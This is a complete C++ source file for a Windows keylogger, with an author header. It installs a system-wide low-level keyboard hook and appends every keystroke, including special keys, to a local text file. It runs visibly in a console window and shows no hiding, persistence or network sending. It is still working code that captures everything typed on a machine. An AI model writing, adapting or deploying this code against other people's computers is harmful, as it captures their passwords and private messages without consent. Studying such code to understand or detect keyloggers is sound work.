/*
# Windows Keylogger
Author: Fateme Ordikhani  
Date:  2025-08-01  
Version:  1.0  
Language: C++  
Platform: Windows  
Description:  
A simple Windows keylogger implemented in C++ using the WinAPI.  
It captures keyboard input via a low-level keyboard hook (`WH_KEYBOARD_LL`)  
and logs both special keys and printable characters into a text file (`key_file.txt`).

*/
#include <windows.h>
#include <fstream>
#include <iostream>
#include <atomic>

using namespace std;

HHOOK hHook;
ofstream file;
atomic<bool> g_bRunning(true);
DWORD mainThreadId;

// Helper function to write special keys as text
void LogSpecialKey(ofstream& file, DWORD vkCode) {
    switch (vkCode) {
        case VK_SHIFT:   file << "[SHIFT]"; break;
        case VK_LSHIFT:  file << "[LSHIFT]"; break;
        case VK_RSHIFT:  file << "[RSHIFT]"; break;
        case VK_CONTROL: file << "[CONTROL]"; break;
        case VK_LCONTROL:file << "[LCTRL]"; break;
        case VK_RCONTROL:file << "[RCTRL]"; break;
        case VK_MENU:    file << "[ALT]"; break;
        case VK_LMENU:   file << "[LALT]"; break;
        case VK_RMENU:   file << "[RALT]"; break;
        case VK_RETURN:  file << "[ENTER]\n"; break;
        case VK_ESCAPE:  file << "[ESC]"; break;
        case VK_BACK:    file << "[BACKSPACE]"; break;
        case VK_TAB:     file << "[TAB]"; break;
        case VK_DELETE:  file << "[DEL]"; break;
        case VK_CAPITAL: file << "[CAPSLOCK]"; break;
        case VK_SPACE:   file << ' '; break;
        default:
        file << char(tolower( vkCode));
            // file << "[0x" << hex << uppercase << vkCode << "]";
    }
}

// Callback function for keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKey->vkCode;

            file.open("key_file.txt", ios::app);
            if (file.is_open()) {
                // Handle known special keys
                if ((vkCode >= VK_SHIFT && vkCode <= VK_RMENU) ||
                    vkCode == VK_RETURN || vkCode == VK_ESCAPE ||
                    vkCode == VK_BACK || vkCode == VK_TAB ||
                    vkCode == VK_DELETE || vkCode == VK_CAPITAL ||
                    vkCode == VK_SPACE) {
                    LogSpecialKey(file, vkCode);
                } else {
                    // Get keyboard state
                    BYTE keyboardState[256];
                    if (!GetKeyboardState(keyboardState)) {
                        LogSpecialKey(file, vkCode);
                    } else {
                        // Prepare buffer for character output
                        WCHAR buffer[5] = { 0 };
                        int ret = ToUnicode(vkCode, pKey->scanCode, keyboardState, buffer, 4, 0);

                        if (ret > 0) {
                            bool printed = false;
                            for (int i = 0; i < ret; i++) {
                                WCHAR wc = buffer[i];
                                // Print only alphanumeric or space; others as hex
                                if (iswalnum(wc) || wc == L' ') {
                                    file << (char)wc;
                                    printed = true;
                                }
                            }
                            if (!printed) {
                                // No alphanumeric printed -> treat as special
                                file << "[0x" << hex << uppercase << vkCode << "]";
                            }
                        } else {
                            LogSpecialKey(file, vkCode);
                        }
                    }
                }
                file.close();
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Console control handler
BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    if (dwCtrlType == CTRL_C_EVENT) {
        g_bRunning = false;
        PostThreadMessage(mainThreadId, WM_QUIT, 0, 0);
        return TRUE;
    }
    return FALSE;
}

// Entry point
int main() {
    mainThreadId = GetCurrentThreadId();
    
    // Set console control handler
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        cout << "Error setting control handler!" << endl;
        return 1;
    }

    // Install the low-level keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (!hHook) {
        cout << "Hook installation failed." << endl;
        return 1;
    }

    cout << "Keylogger started. Press Ctrl+C to stop." << endl;

    // Message loop to keep the hook running
    MSG msg;
    while (g_bRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    cout << "Keylogger stopped. Exiting..." << endl;
    return 0;
}

